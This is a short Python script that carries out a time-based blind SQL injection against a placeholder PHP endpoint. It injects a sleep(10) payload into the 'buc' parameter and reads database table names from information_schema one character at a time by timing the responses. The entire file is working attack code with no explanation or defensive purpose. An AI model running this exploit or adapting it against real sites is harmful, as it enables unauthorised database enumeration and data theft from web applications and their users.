import requests


chars = "abcdefghijklmnopqrstuvwxyz123456789*!$#/|&"

for n in range(10):

	for i in range(1,21):

		for char in chars:
			r = requests.get("https://domain/ajs.php?buc=439'and+(select+sleep(10)+from+dual+where+\
				substring((select+table_name+from+information_schema.tables+where+table_schema%3ddatabase()\
				+limit+"+str(n)+",1),"+str(i)+",1)+like+'"+char+"')--+-")


			secs = r.elapsed.total_seconds()

			if secs > 10:
				print char,

	print "\n"
